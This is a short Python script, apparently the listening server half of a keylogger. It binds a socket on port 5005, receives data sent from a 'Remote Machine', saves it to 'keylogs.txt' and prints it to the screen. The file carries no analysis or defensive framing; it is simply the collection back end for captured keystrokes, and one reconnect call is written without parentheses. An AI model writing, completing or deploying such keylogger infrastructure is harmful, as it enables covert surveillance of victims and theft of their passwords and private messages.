import socket
import os

HOST = "0.0.0.0"
PORT = 5005

class Server:
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def __init__(self, host, port):
        self.objSocket.bind((host, port))
        self.objSocket.listen(socket.SOMAXCONN)
        self.host = host
        self.port = port

    def connect(self):
        while (True):
            try:
                conn, address = self.objSocket.accept()
                self.receive(conn, address)

            except socket.error:
                print("[!] Failed Connecting to Remote Machine\n")
                exit(1)

    def receive(self, conn, address):
        while (True):
            try:
                bufferSize = int(conn.recv(1024))
                fileData = str(conn.recv(bufferSize), "utf-8")

                with open("keylogs.txt", "w") as LogFile:
                    LogFile.write(fileData)

                os.system("clear" if os.name == "posix" else "cls")
                print(fileData)

                continue

            except socket.error:
                print(f"[!] Failed to Connect to Remote Machine ~ {address[0]}\nAttempting to Reconnect...")
                conn.close(); del(conn)
                break

        self.connect

server = Server(HOST, PORT)
server.connect()
